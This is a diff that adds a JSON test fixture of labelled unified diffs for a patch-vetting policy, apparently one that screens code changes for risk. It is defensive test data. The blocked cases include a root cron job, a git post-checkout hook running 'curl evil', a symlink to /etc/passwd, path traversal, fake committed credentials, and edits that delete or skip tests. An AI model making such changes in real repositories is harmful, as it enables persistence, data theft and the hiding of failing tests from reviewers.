@@ -1,0 +1,164 @@
+{
+ "dataset": "patch_policy",
+ "version": "2026.10.1",
+ "description": "Unified diffs labelled blocked/allowed by the patch policy. Credential-like strings are fake.",
+ "cases": [
+  {
+   "id": "clean-change-in-plan",
+   "diff": "diff --git a/app/service.py b/app/service.py\n--- a/app/service.py\n+++ b/app/service.py\n@@ -1,1 +1,1 @@\n-    return x\n+    return x.strip()\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": false
+  },
+  {
+   "id": "new-test-file-outside-plan-ok",
+   "diff": "diff --git a/tests/test_trim.py b/tests/test_trim.py\nnew file mode 100644\n--- /dev/null\n+++ b/tests/test_trim.py\n@@ -0,0 +1,2 @@\n+def test_trim():\n+    assert True\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": false
+  },
+  {
+   "id": "rename-test-ok",
+   "diff": "diff --git a/tests/test_a.py b/tests/test_a.py\n--- a/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -1,1 +1,1 @@\n-def test_old():\n+def test_new():\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": false
+  },
+  {
+   "id": "risky-but-allowed",
+   "diff": "diff --git a/app/service.py b/app/service.py\n--- a/app/service.py\n+++ b/app/service.py\n@@ -1,1 +1,1 @@\n-pass\n+import subprocess\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": false,
+   "expect_warning": true
+  },
+  {
+   "id": "file-outside-plan",
+   "diff": "diff --git a/app/admin.py b/app/admin.py\n--- a/app/admin.py\n+++ b/app/admin.py\n@@ -1,1 +1,1 @@\n-a = 1\n+a = 2\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "path-traversal",
+   "diff": "diff --git a/../outside.py b/../outside.py\nnew file mode 100644\n--- /dev/null\n+++ b/../outside.py\n@@ -0,0 +1,1 @@\n+x = 1\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "absolute-path",
+   "diff": "diff --git a//etc/cron.d/job b//etc/cron.d/job\nnew file mode 100644\n--- /dev/null\n+++ b//etc/cron.d/job\n@@ -0,0 +1,1 @@\n+* * * * * root sh\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "git-hook",
+   "diff": "diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout\nnew file mode 100644\n--- /dev/null\n+++ b/.git/hooks/post-checkout\n@@ -0,0 +1,2 @@\n+#!/bin/sh\n+curl evil\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "symlink",
+   "diff": "diff --git a/app/link b/app/link\nnew file mode 120000\n--- /dev/null\n+++ b/app/link\n@@ -0,0 +1,1 @@\n+/etc/passwd\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "submodule",
+   "diff": "diff --git a/vendor/lib b/vendor/lib\nnew file mode 160000\n--- /dev/null\n+++ b/vendor/lib\n@@ -0,0 +1,1 @@\n+Subproject commit abc\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "binary",
+   "diff": "diff --git a/app/blob.bin b/app/blob.bin\nnew file mode 100644\nGIT binary patch\nliteral 3\nKcmZ?\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "github-token",
+   "diff": "diff --git a/app/service.py b/app/service.py\n--- a/app/service.py\n+++ b/app/service.py\n@@ -1,1 +1,1 @@\n-TOKEN = None\n+TOKEN = 'ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4'\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "aws-key",
+   "diff": "diff --git a/app/service.py b/app/service.py\n--- a/app/service.py\n+++ b/app/service.py\n@@ -1,1 +1,1 @@\n-pass\n+AWS = 'AKIAABCDEFGHIJKLMNOP'\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "password-assignment",
+   "diff": "diff --git a/app/service.py b/app/service.py\n--- a/app/service.py\n+++ b/app/service.py\n@@ -1,1 +1,1 @@\n-pass\n+password = 'hunter2hunter2'\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "private-key",
+   "diff": "diff --git a/app/key.pem b/app/key.pem\nnew file mode 100644\n--- /dev/null\n+++ b/app/key.pem\n@@ -0,0 +1,3 @@\n+-----BEGIN RSA PRIVATE KEY-----\n+MIIEow\n+-----END RSA PRIVATE KEY-----\n",
+   "allowed_files": null,
+   "expect_blocked": true
+  },
+  {
+   "id": "delete-test-file",
+   "diff": "diff --git a/tests/test_a.py b/tests/test_a.py\ndeleted file mode 100644\n--- a/tests/test_a.py\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-def test_a():\n-    assert 1\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "remove-test-function",
+   "diff": "diff --git a/tests/test_a.py b/tests/test_a.py\n--- a/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -1,2 +1,0 @@\n-def test_edge_case():\n-    assert f(120)\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "add-skip-marker",
+   "diff": "diff --git a/tests/test_a.py b/tests/test_a.py\n--- a/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -1,1 +1,2 @@\n-def test_edge_case():\n+@pytest.mark.skip(reason='later')\n+def test_edge_case():\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "add-xfail-marker",
+   "diff": "diff --git a/tests/test_a.py b/tests/test_a.py\n--- a/tests/test_a.py\n+++ b/tests/test_a.py\n@@ -1,1 +1,2 @@\n-def test_edge_case():\n+@pytest.mark.xfail\n+def test_edge_case():\n",
+   "allowed_files": [
+    "app/service.py",
+    "app/errors.py"
+   ],
+   "expect_blocked": true
+  },
+  {
+   "id": "empty",
+   "diff": "  \n",
+   "allowed_files": null,
+   "expect_blocked": true
+  }
+ ]
+}
